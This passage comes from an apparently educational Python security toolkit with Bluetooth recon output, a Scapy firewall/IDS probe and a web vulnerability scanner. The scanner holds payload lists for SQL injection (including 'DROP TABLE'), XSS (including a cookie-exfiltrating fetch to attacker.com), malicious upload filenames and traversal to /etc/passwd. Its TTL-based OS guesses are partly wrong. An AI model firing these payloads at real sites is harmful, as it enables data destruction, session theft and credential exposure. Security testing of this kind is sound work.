                cli_manager.console.print(table)
                
                if saved_files:
                    cli_manager.console.print(f"\n[green]Results saved to:[/green] {', '.join(saved_files)}")
            else:
                print(f"\nReconnaissance Summary:")
                print(f"Total devices: {results['summary']['total_devices']}")
                print(f"Classic devices: {results['summary']['classic_devices']}")
                print(f"BLE devices: {results['summary']['ble_devices']}")
                print(f"Adapters found: {results['summary']['adapters_found']}")
                print(f"Scan duration: {results['summary']['scan_duration']:.2f}s")
                
                if saved_files:
                    print(f"\nResults saved to: {', '.join(saved_files)}")
        
        asyncio.run(run_recon())
        
    except ImportError as e:
        error_msg = f"Reconnaissance module not available: {e}"
        error_handler.log_error(error_msg)
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel(error_msg, style="bold red"))
        else:
            print(f"Error: {error_msg}")
    except Exception as e:
        error_msg = f"Error during reconnaissance: {e}"
        error_handler.log_error(error_msg)
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(Panel(error_msg, style="bold red"))
        else:
            print(f"Error: {error_msg}")


def _bluetooth_cli_demo():
    """Demonstrate CLI interface capabilities."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel("Bluetooth CLI Interface Demo", style="bold blue"))
    else:
        print("\nBluetooth CLI Interface Demo")
        print("=" * 30)
    
    demo_commands = [
        "python plugins/bluetooth_tools.py scan --timeout 15",
        "python plugins/bluetooth_tools.py scan --ble --output bluetooth_scan.json",
        "python plugins/bluetooth_tools.py pair --mac 00:11:22:33:44:55 --timeout 30",
        "python plugins/bluetooth_tools.py services --mac 00:11:22:33:44:55 --output services.csv",
        "python plugins/bluetooth_tools.py security --mac 00:11:22:33:44:55 --enhanced",
        "python plugins/bluetooth_tools.py auto --timeout 10 --test-pairing --enumerate-services",
        "python plugins/bluetooth_tools.py info --output adapter_info.json"
    ]
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        from rich.syntax import Syntax
        cli_manager.console.print("\n[bold]Available CLI Commands:[/bold]")
        for cmd in demo_commands:
            syntax = Syntax(cmd, "bash", theme="monokai", line_numbers=False)
            cli_manager.console.print(syntax)
    else:
        print("\nAvailable CLI Commands:")
        for i, cmd in enumerate(demo_commands, 1):
            print(f"{i}. {cmd}")
    
    print("\nThese commands can be run directly from the command line for automation and scripting!")
    print("The CLI interface supports:")
    print("- JSON and CSV output formats")
    print("- BLE scanning with Bleak library")
    print("- Automated discovery and testing")
    print("- Enhanced security analysis")
    print("- Retry logic and error handling")


def _display_enhanced_security_results(results: dict):
    """Display enhanced security check results."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        from rich.table import Table
        
        # Main results table
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="yellow")
        
        table.add_row("Target Device", results.get('target', 'Unknown'))
        table.add_row("Security Score", f"{results.get('security_score', 0)}/100")
        table.add_row("Encryption Status", results.get('encryption_status', 'Unknown'))
        table.add_row("Authentication", results.get('authentication_required', 'Unknown'))
        
        cli_manager.console.print(table)
        
        # Vulnerable services
        if results.get('vulnerable_services'):
            vuln_table = Table(show_header=True, header_style="bold red")
            vuln_table.add_column("Service", style="yellow")
            vuln_table.add_column("Risk Level", style="red")
            vuln_table.add_column("Description", style="white")
            
            for service in results['vulnerable_services']:
                vuln_table.add_row(
                    service.get('service', 'Unknown'),
                    service.get('risk', 'Unknown'),
                    service.get('description', 'No description')
                )
            
            cli_manager.console.print("\n[bold red]Vulnerable Services:[/bold red]")
            cli_manager.console.print(vuln_table)
        
        # Recommendations
        if results.get('recommendations'):
            cli_manager.console.print("\n[bold green]Security Recommendations:[/bold green]")
            for rec in results['recommendations']:
                cli_manager.console.print(f"• {rec}")
    
    else:
        print("\nEnhanced Security Check Results:")
        print(f"Target Device: {results.get('target', 'Unknown')}")
        print(f"Security Score: {results.get('security_score', 0)}/100")
        print(f"Encryption Status: {results.get('encryption_status', 'Unknown')}")
        print(f"Authentication Required: {results.get('authentication_required', 'Unknown')}")
        
        if results.get('vulnerable_services'):
            print("\nVulnerable Services:")
            for service in results['vulnerable_services']:
                print(f"  - {service.get('service', 'Unknown')} ({service.get('risk', 'Unknown')} risk)")
                print(f"    {service.get('description', 'No description')}")
        
        if results.get('recommendations'):
            print("\nSecurity Recommendations:")
            for rec in results['recommendations']:
                print(f"  • {rec}")


def _display_automated_test_results(results: dict):
    """Display automated testing results."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        from rich.table import Table
        
        # Summary table
        summary_table = Table(show_header=True, header_style="bold magenta")
        summary_table.add_column("Test Phase", style="cyan")
        summary_table.add_column("Results", style="yellow")
        
        discovery = results.get('discovery_results', {})
        summary_table.add_row("Discovery", f"{discovery.get('total_devices', 0)} devices found")
        summary_table.add_row("Pairing Tests", f"{len(results.get('pairing_results', []))} attempted")
        summary_table.add_row("Service Enumeration", f"{len(results.get('service_results', []))} completed")
        summary_table.add_row("Security Scans", f"{len(results.get('security_results', []))} performed")
        
        cli_manager.console.print(summary_table)
        
        # Show discovered devices
        if discovery.get('devices'):
            device_table = Table(show_header=True, header_style="bold blue")
            device_table.add_column("Address", style="yellow")
            device_table.add_column("Name", style="green")
            device_table.add_column("Type", style="cyan")
            
            for device in discovery['devices']:
                device_table.add_row(
                    device.get('address', 'Unknown'),
                    device.get('name', 'Unknown'),
                    device.get('device_type', 'Classic')
                )
            
            cli_manager.console.print("\n[bold blue]Discovered Devices:[/bold blue]")
            cli_manager.console.print(device_table)
    
    else:
        print("\nAutomated Testing Results:")
        discovery = results.get('discovery_results', {})
        print(f"Devices Found: {discovery.get('total_devices', 0)}")
        print(f"Pairing Tests: {len(results.get('pairing_results', []))} attempted")
        print(f"Service Enumeration: {len(results.get('service_results', []))} completed")
        print(f"Security Scans: {len(results.get('security_results', []))} performed")
        
        if discovery.get('devices'):
            print("\nDiscovered Devices:")
            for device in discovery['devices']:
                print(f"  {device.get('address', 'Unknown')} - {device.get('name', 'Unknown')}")
    
    # Show errors if any
    if results.get('errors'):
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[bold red]Errors:[/bold red]")
            for error in results['errors']:
                cli_manager.console.print(f"• {error}")
        else:
            print("\nErrors:")
            for error in results['errors']:
                print(f"  • {error}")


def firewall_ids_detection():
    """Test for firewall and IDS detection using TTL and ICMP analysis."""
    print("\n[Firewall/IDS Detection Tool]")
    print("⚠️  WARNING: Only test systems you own or have explicit permission to test.")
    
    target = safe_input("Enter target IP/hostname: ")
    if not target:
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Testing {target} for firewall/IDS detection...[/bold green]")
    else:
        print(f"\nTesting {target} for firewall/IDS detection...")
    
    detection_results = {
        "firewall_detected": False,
        "ids_detected": False,
        "ttl_analysis": {},
        "icmp_analysis": {},
        "port_analysis": {}
    }
    
    # TTL Analysis
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold yellow]Phase 1: TTL Analysis[/bold yellow]")
    else:
        print("\nPhase 1: TTL Analysis")
    
    ttl_values = []
    for i in range(5):
        try:
            # Send ICMP echo request
            ping = scapy.IP(dst=target)/scapy.ICMP()
            reply = scapy.sr1(ping, timeout=2, verbose=False)
            
            if reply:
                ttl = reply.ttl
                ttl_values.append(ttl)
                
                # Analyze TTL patterns
                if ttl <= 32:
                    os_type = "Windows"
                elif ttl <= 64:
                    os_type = "Linux/Unix"
                elif ttl <= 128:
                    os_type = "Windows (older)"
                else:
                    os_type = "Unknown"
                
                detection_results["ttl_analysis"][f"probe_{i+1}"] = {
                    "ttl": ttl,
                    "os_type": os_type,
                    "response_time": reply.time
                }
                
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(f"  [green]Probe {i+1}:[/green] TTL={ttl} ({os_type})")
                else:
                    print(f"  Probe {i+1}: TTL={ttl} ({os_type})")
            else:
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(f"  [red]Probe {i+1}:[/red] No response")
                else:
                    print(f"  Probe {i+1}: No response")
        except Exception as e:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"  [red]Probe {i+1}:[/red] Error - {e}")
            else:
                print(f"  Probe {i+1}: Error - {e}")
    
    # ICMP Analysis
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold yellow]Phase 2: ICMP Analysis[/bold yellow]")
    else:
        print("\nPhase 2: ICMP Analysis")
    
    icmp_types = [0, 3, 8, 13, 15, 17]  # Common ICMP types
    
    for icmp_type in icmp_types:
        try:
            # Send different ICMP types
            icmp_packet = scapy.IP(dst=target)/scapy.ICMP(type=icmp_type)
            reply = scapy.sr1(icmp_packet, timeout=2, verbose=False)
            
            if reply:
                detection_results["icmp_analysis"][f"type_{icmp_type}"] = {
                    "response": True,
                    "response_type": reply[scapy.ICMP].type,
                    "response_code": reply[scapy.ICMP].code
                }
                
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(f"  [green]ICMP {icmp_type}:[/green] Response (type={reply[scapy.ICMP].type}, code={reply[scapy.ICMP].code})")
                else:
                    print(f"  ICMP {icmp_type}: Response (type={reply[scapy.ICMP].type}, code={reply[scapy.ICMP].code})")
            else:
                detection_results["icmp_analysis"][f"type_{icmp_type}"] = {
                    "response": False
                }
                
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(f"  [red]ICMP {icmp_type}:[/red] No response (likely blocked)")
                else:
                    print(f"  ICMP {icmp_type}: No response (likely blocked)")
        except Exception as e:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"  [red]ICMP {icmp_type}:[/red] Error - {e}")
            else:
                print(f"  ICMP {icmp_type}: Error - {e}")
    
    # Port Analysis
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold yellow]Phase 3: Port Analysis[/bold yellow]")
    else:
        print("\nPhase 3: Port Analysis")
    
    test_ports = [22, 23, 25, 53, 80, 443, 3389, 8080]
    
    for port in test_ports:
        try:
            # TCP SYN scan
            syn_packet = scapy.IP(dst=target)/scapy.TCP(dport=port, flags="S")
            reply = scapy.sr1(syn_packet, timeout=2, verbose=False)
            
            if reply:
                if reply.haslayer(scapy.TCP):
                    if reply[scapy.TCP].flags == 0x12:  # SYN-ACK
                        detection_results["port_analysis"][port] = "open"
                        if cli_manager.enable_rich and RICH_AVAILABLE:
                            cli_manager.console.print(f"  [green]Port {port}:[/green] Open")
                        else:
                            print(f"  Port {port}: Open")
                    elif reply[scapy.TCP].flags == 0x14:  # RST-ACK
                        detection_results["port_analysis"][port] = "closed"
                        if cli_manager.enable_rich and RICH_AVAILABLE:
                            cli_manager.console.print(f"  [green]Port {port}:[/green] Closed")
                        else:
                            print(f"  Port {port}: Closed")
                elif reply.haslayer(scapy.ICMP):
                    detection_results["port_analysis"][port] = "filtered"
                    if cli_manager.enable_rich and RICH_AVAILABLE:
                        cli_manager.console.print(f"  [red]Port {port}:[/red] Filtered (ICMP unreachable)")
                    else:
                        print(f"  Port {port}: Filtered (ICMP unreachable)")
            else:
                detection_results["port_analysis"][port] = "filtered"
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(f"  [red]Port {port}:[/red] Filtered (no response)")
                else:
                    print(f"  Port {port}: Filtered (no response)")
        except Exception as e:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"  [red]Port {port}:[/red] Error - {e}")
            else:
                print(f"  Port {port}: Error - {e}")
    
    # Analysis and conclusions
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Detection Analysis Results:[/bold green]")
        
        # TTL consistency
        if len(set(ttl_values)) == 1 and len(ttl_values) > 0:
            cli_manager.console.print(f"  [green]✓ TTL Consistency:[/green] Consistent TTL values (no TTL manipulation)")
        else:
            cli_manager.console.print(f"  [red]⚠️  TTL Inconsistency:[/red] Varying TTL values (possible TTL manipulation)")
        
        # ICMP filtering
        icmp_responses = sum(1 for result in detection_results["icmp_analysis"].values() if result.get("response", False))
        if icmp_responses == 0:
            cli_manager.console.print(f"  [red]⚠️  ICMP Filtering:[/red] All ICMP types blocked (likely firewall)")
        elif icmp_responses < len(icmp_types):
            cli_manager.console.print(f"  [yellow]⚠️  Partial ICMP Filtering:[/yellow] Some ICMP types blocked")
        else:
            cli_manager.console.print(f"  [green]✓ ICMP Open:[/green] All ICMP types allowed")
        
        # Port filtering
        filtered_ports = sum(1 for result in detection_results["port_analysis"].values() if result == "filtered")
        if filtered_ports > len(test_ports) * 0.5:
            cli_manager.console.print(f"  [red]⚠️  Port Filtering:[/red] Most ports filtered (likely firewall)")
        elif filtered_ports > 0:
            cli_manager.console.print(f"  [yellow]⚠️  Partial Port Filtering:[/yellow] Some ports filtered")
        else:
            cli_manager.console.print(f"  [green]✓ Port Access:[/green] Most ports accessible")
    else:
        print(f"\nDetection Analysis Results:")
        
        # TTL consistency
        if len(set(ttl_values)) == 1 and len(ttl_values) > 0:
            print(f"  ✓ TTL Consistency: Consistent TTL values (no TTL manipulation)")
        else:
            print(f"  ⚠️  TTL Inconsistency: Varying TTL values (possible TTL manipulation)")
        
        # ICMP filtering
        icmp_responses = sum(1 for result in detection_results["icmp_analysis"].values() if result.get("response", False))
        if icmp_responses == 0:
            print(f"  ⚠️  ICMP Filtering: All ICMP types blocked (likely firewall)")
        elif icmp_responses < len(icmp_types):
            print(f"  ⚠️  Partial ICMP Filtering: Some ICMP types blocked")
        else:
            print(f"  ✓ ICMP Open: All ICMP types allowed")
        
        # Port filtering
        filtered_ports = sum(1 for result in detection_results["port_analysis"].values() if result == "filtered")
        if filtered_ports > len(test_ports) * 0.5:
            print(f"  ⚠️  Port Filtering: Most ports filtered (likely firewall)")
        elif filtered_ports > 0:
            print(f"  ⚠️  Partial Port Filtering: Some ports filtered")
        else:
            print(f"  ✓ Port Access: Most ports accessible")
    
    # Save detailed report
    report_content = f"""
Firewall/IDS Detection Report
============================
Target: {target}
Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

TTL Analysis:
{chr(10).join([f'- Probe {k}: TTL={v["ttl"]} ({v["os_type"]})' for k, v in detection_results["ttl_analysis"].items()])}

ICMP Analysis:
{chr(10).join([f'- ICMP {k.split("_")[1]}: {"Response" if v.get("response") else "Blocked"}' for k, v in detection_results["icmp_analysis"].items()])}

Port Analysis:
{chr(10).join([f'- Port {k}: {v}' for k, v in detection_results["port_analysis"].items()])}

Conclusions:
- TTL Consistency: {"Consistent" if len(set(ttl_values)) == 1 else "Inconsistent"}
- ICMP Filtering: {"Blocked" if icmp_responses == 0 else "Partial" if icmp_responses < len(icmp_types) else "Open"}
- Port Filtering: {"Heavy" if filtered_ports > len(test_ports) * 0.5 else "Partial" if filtered_ports > 0 else "Minimal"}
        """
    save_report(report_content.strip(), f"firewall_detection_{target}")


def web_vulnerability_scanner():
    """Enhanced web vulnerability scanner with advanced payloads and file upload detection."""
    print("\n[Enhanced Web Vulnerability Scanner]")
    print("⚠️  WARNING: This tool is for educational purposes and local testing only.")
    print("Only scan web applications you own or have explicit permission to test.")
    
    # Check if required libraries are available
    if not REQUESTS_AVAILABLE or not BEAUTIFULSOUP_AVAILABLE:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Required libraries not found.[/red]")
            cli_manager.console.print("Please install: pip install requests beautifulsoup4")
        else:
            print("❌ Required libraries not found.")
            print("Please install: pip install requests beautifulsoup4")
        return
    
    # Get target URL
    target_url = safe_input("Enter target URL (e.g., http://localhost:8080): ")
    if not target_url:
        return
    
    # Ensure URL has protocol
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Scanning:[/bold green] {target_url}")
    else:
        print(f"\nScanning: {target_url}")
    
    # Test basic connectivity
    try:
        response = requests.get(target_url, timeout=10)
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[green]✓ Target is accessible (Status: {response.status_code})[/green]")
        else:
            print(f"✓ Target is accessible (Status: {response.status_code})")
    except Exception as e:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]❌ Cannot access target: {e}[/red]")
        else:
            print(f"❌ Cannot access target: {e}")
        return
    
    # Enhanced scan options
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold cyan]Scan Options:[/bold cyan]")
        cli_manager.console.print("1. [green]SQL Injection Scanner[/green] - Advanced SQLi payloads")
        cli_manager.console.print("2. [yellow]XSS Scanner[/yellow] - Comprehensive XSS testing")
        cli_manager.console.print("3. [blue]File Upload Vulnerability[/blue] - Upload testing")
        cli_manager.console.print("4. [red]Directory Traversal[/red] - Path traversal testing")
        cli_manager.console.print("5. [magenta]Information Disclosure[/magenta] - Sensitive file detection")
        cli_manager.console.print("6. [cyan]Comprehensive Scan[/cyan] - All vulnerability tests")
        cli_manager.console.print("0. [white]Back to main menu[/white]")
    else:
        print("\nScan Options:")
        print("1. SQL Injection Scanner - Advanced SQLi payloads")
        print("2. XSS Scanner - Comprehensive XSS testing")
        print("3. File Upload Vulnerability - Upload testing")
        print("4. Directory Traversal - Path traversal testing")
        print("5. Information Disclosure - Sensitive file detection")
        print("6. Comprehensive Scan - All vulnerability tests")
        print("0. Back to main menu")
    
    choice = safe_input("Select scan type: ")
    if not choice:
        return
    
    if choice == "0":
        return
    
    # Enhanced SQL injection payloads
    sql_payloads = [
        # Basic SQLi
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "admin'--",
        "1' OR '1'='1'--",
        
        # Advanced SQLi
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT @@version--",
        "' UNION SELECT database()--",
        "' UNION SELECT user()--",
        "' UNION SELECT schema_name FROM information_schema.schemata--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        
        # Blind SQLi
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND (SELECT LENGTH(password) FROM users WHERE id=1)>0--",
        "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)>0--",
        
        # Time-based SQLi
        "' AND (SELECT SLEEP(5))--",
        "' AND (SELECT BENCHMARK(1000000,MD5(1)))--",
        
        # Error-based SQLi
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--"
    ]
    
    # Enhanced XSS payloads
    xss_payloads = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        
        # Advanced XSS
        "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
        "<svg><script>alert('XSS')</script></svg>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        
        # Filter bypass
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert('XSS'.toLowerCase())</script>",
        
        # DOM XSS
        "javascript:alert(document.domain)",
        "javascript:alert(location.href)",
        "javascript:alert(document.cookie)"
    ]
    
    # File upload test payloads
    upload_payloads = [
        # Malicious file extensions
        "test.php", "test.php3", "test.php4", "test.php5", "test.phtml",
        "test.asp", "test.aspx", "test.jsp", "test.jspx",
        "test.exe", "test.bat", "test.cmd", "test.sh",
        
        # Double extensions
        "test.jpg.php", "test.png.asp", "test.gif.jsp",
        
        # Null byte injection
        "test.php%00.jpg", "test.asp%00.png",
        
        # Case variations
        "test.PHP", "test.PhP", "test.pHp",
        
        # MIME type bypass
        "test.php;.jpg", "test.asp;.png"
    ]
    
    # Enhanced directory traversal payloads
    traversal_payloads = [
        # Unix paths
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        
        # Windows paths
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
        
        # Encoded paths
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        
        # Alternative encodings
        "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts"
    ]
    
    # Initialize results
    scan_results = {
        'sql_injection': [],
        'xss': [],
        'file_upload': [],
        'directory_traversal': [],
        'information_disclosure': []
    }
    
    def test_sql_injection():
        """Enhanced SQL injection testing."""
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[bold green][SQL Injection Scanner][/bold green]")
            cli_manager.console.print("Testing advanced SQL injection vectors...")
        else:
            print("\n[SQL Injection Scanner]")
            print("Testing advanced SQL injection vectors...")
        
        # Test URL parameters
        test_params = ['id', 'user', 'search', 'q', 'page', 'category', 'product', 'article']
        vulnerable_params = []
        
        # Progress tracking
        total_tests = len(test_params) * len(sql_payloads)
        current_test = 0
        
        for param in test_params:
            for payload in sql_payloads:
                current_test += 1
                
                # Progress display
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    progress = (current_test / total_tests) * 100
                    cli_manager.console.print(f"\r[cyan]Progress:[/cyan] {progress:.1f}% ({current_test}/{total_tests})", end='')
                else:
                    print(f"\rProgress: {current_test}/{total_tests}", end='', flush=True)
                
                try:
                    test_url = f"{target_url}?{param}={payload}"
                    response = requests.get(test_url, timeout=5)
                    
                    # Enhanced error detection
                    error_indicators = [
                        'sql syntax', 'mysql_fetch', 'oracle error', 'sql server',
                        'postgresql', 'sqlite', 'database error', 'mysql error',
                        'ora-', 'microsoft ole db', 'jdbc', 'odbc', 'database',
                        'mysql_num_rows', 'mysql_fetch_array', 'mysql_fetch_object'
                    ]
                    
                    for indicator in error_indicators:
                        if indicator.lower() in response.text.lower():
                            if cli_manager.enable_rich and RICH_AVAILABLE:
                                cli_manager.console.print(f"\n[red]⚠️  Potential SQL injection in parameter '{param}' with payload: {payload}[/red]")
                            else:
                                print(f"\n⚠️  Potential SQL injection in parameter '{param}' with payload: {payload}")
                            vulnerable_params.append(param)
                            scan_results['sql_injection'].append({
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'evidence': f"Found error indicator: {indicator}"
                            })
                            break
                    
                except Exception as e:
                    continue
        
        print()  # New line after progress
        
        if vulnerable_params:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✅ Found {len(set(vulnerable_params))} potentially vulnerable parameters[/green]")
            else:
                print(f"\n✅ Found {len(set(vulnerable_params))} potentially vulnerable parameters")
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✅ No obvious SQL injection vulnerabilities detected[/green]")
            else:
                print("✅ No obvious SQL injection vulnerabilities detected")
    
    def test_xss():
        """Enhanced XSS testing."""
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[bold yellow][XSS Scanner][/bold yellow]")
            cli_manager.console.print("Testing comprehensive XSS vectors...")
        else:
            print("\n[XSS Scanner]")
            print("Testing comprehensive XSS vectors...")
        
        # Test URL parameters
        test_params = ['search', 'q', 'name', 'comment', 'message', 'content', 'text', 'input']
        vulnerable_params = []
        
        # Progress tracking
        total_tests = len(test_params) * len(xss_payloads)
        current_test = 0
        
        for param in test_params:
            for payload in xss_payloads:
                current_test += 1
                
                # Progress display
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    progress = (current_test / total_tests) * 100
                    cli_manager.console.print(f"\r[cyan]Progress:[/cyan] {progress:.1f}% ({current_test}/{total_tests})", end='')
                else:
                    print(f"\rProgress: {current_test}/{total_tests}", end='', flush=True)
                
                try:
                    test_url = f"{target_url}?{param}={payload}"
                    response = requests.get(test_url, timeout=5)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        if cli_manager.enable_rich and RICH_AVAILABLE:
                            cli_manager.console.print(f"\n[red]⚠️  Potential XSS in parameter '{param}' with payload: {payload}[/red]")
                        else:
                            print(f"\n⚠️  Potential XSS in parameter '{param}' with payload: {payload}")
                        vulnerable_params.append(param)
                        scan_results['xss'].append({
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'evidence': "Payload reflected in response"
                        })
                    
                except Exception as e:
                    continue
        
        print()  # New line after progress
        
        if vulnerable_params:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✅ Found {len(set(vulnerable_params))} potentially vulnerable parameters[/green]")
            else:
                print(f"\n✅ Found {len(set(vulnerable_params))} potentially vulnerable parameters")
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✅ No obvious XSS vulnerabilities detected[/green]")
            else:
                print("✅ No obvious XSS vulnerabilities detected")
    
    def test_file_upload():
        """Test for file upload vulnerabilities."""
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[bold blue][File Upload Vulnerability Scanner][/bold blue]")
            cli_manager.console.print("Testing file upload vulnerabilities...")
        else:
            print("\n[File Upload Vulnerability Scanner]")
            print("Testing file upload vulnerabilities...")
        
        # Common upload paths
        upload_paths = ['/upload', '/file', '/upload.php', '/upload.asp', '/upload.jsp', '/admin/upload']
        vulnerable_paths = []
        
        # Create test file content
        test_content = "<?php echo 'Vulnerable'; ?>"
        
        for path in upload_paths:
            for payload in upload_payloads:
                try:
                    test_url = f"{target_url}{path}"
                    
                    # Try to upload file
                    files = {'file': (payload, test_content, 'text/plain')}
                    response = requests.post(test_url, files=files, timeout=5)
                    
                    # Check if upload was successful
                    if response.status_code in [200, 201]:
                        # Try to access the uploaded file
                        if cli_manager.enable_rich and RICH_AVAILABLE:
                            cli_manager.console.print(f"\n[red]⚠️  Potential file upload vulnerability at '{path}' with filename: {payload}[/red]")
                        else:
                            print(f"\n⚠️  Potential file upload vulnerability at '{path}' with filename: {payload}")
                        vulnerable_paths.append(path)
                        scan_results['file_upload'].append({
                            'path': path,
                            'filename': payload,
                            'url': test_url,
                            'evidence': f"Upload successful with status {response.status_code}"
                        })
                    
                except Exception as e:
                    continue
        
        if vulnerable_paths:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✅ Found {len(set(vulnerable_paths))} potentially vulnerable upload paths[/green]")
            else:
                print(f"\n✅ Found {len(set(vulnerable_paths))} potentially vulnerable upload paths")
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✅ No obvious file upload vulnerabilities detected[/green]")
            else:
                print("✅ No obvious file upload vulnerabilities detected")
    
    def test_directory_traversal():
        """Enhanced directory traversal testing."""
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[bold red][Directory Traversal Scanner][/bold red]")
            cli_manager.console.print("Testing advanced directory traversal vectors...")
        else:
            print("\n[Directory Traversal Scanner]")
            print("Testing advanced directory traversal vectors...")
        
        # Test common paths
        test_paths = ['/file', '/download', '/read', '/view', '/show', '/get', '/load', '/include']
        vulnerable_paths = []
        
        for path in test_paths:
            for payload in traversal_payloads:
                try:
                    test_url = f"{target_url}{path}?file={payload}"
                    response = requests.get(test_url, timeout=5)
                    
                    # Enhanced sensitive content detection
                    sensitive_indicators = [
                        'root:', 'bin:', 'daemon:', 'sys:', 'adm:',
                        'localhost', '127.0.0.1', 'windows', 'system32',
                        'mysql', 'apache', 'nginx', 'php', 'asp',
                        'password', 'secret', 'key', 'token'
                    ]
                    
                    for indicator in sensitive_indicators:
                        if indicator.lower() in response.text.lower():
                            if cli_manager.enable_rich and RICH_AVAILABLE:
                                cli_manager.console.print(f"\n[red]⚠️  Potential directory traversal in path '{path}' with payload: {payload}[/red]")
                            else:
                                print(f"\n⚠️  Potential directory traversal in path '{path}' with payload: {payload}")
                            vulnerable_paths.append(path)
                            scan_results['directory_traversal'].append({
                                'path': path,
                                'payload': payload,
                                'url': test_url,
                                'evidence': f"Found sensitive content: {indicator}"
                            })
                            break
                    
                except Exception as e:
                    continue
        
        if vulnerable_paths:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✅ Found {len(set(vulnerable_paths))} potentially vulnerable paths[/green]")
            else:
                print(f"\n✅ Found {len(set(vulnerable_paths))} potentially vulnerable paths")
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✅ No obvious directory traversal vulnerabilities detected[/green]")
            else:
                print("✅ No obvious directory traversal vulnerabilities detected")
    
    def test_information_disclosure():
        """Enhanced information disclosure testing."""
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[bold magenta][Information Disclosure Scanner][/bold magenta]")
            cli_manager.console.print("Testing for information disclosure...")
        else:
            print("\n[Information Disclosure Scanner]")
            print("Testing for information disclosure...")
        
        # Enhanced sensitive files and directories
        sensitive_paths = [
            '/robots.txt', '/sitemap.xml', '/.git/config', '/.env', '/config.php',
            '/phpinfo.php', '/admin', '/backup', '/.htaccess', '/web.config',
            '/server-status', '/.well-known/security.txt', '/.svn/entries',
            '/.gitignore', '/composer.json', '/package.json', '/yarn.lock',
            '/.env.local', '/.env.production', '/config.ini', '/database.yml',
            '/wp-config.php', '/config/database.php', '/application.yml',
            '/.DS_Store', '/Thumbs.db', '/desktop.ini'
        ]
        
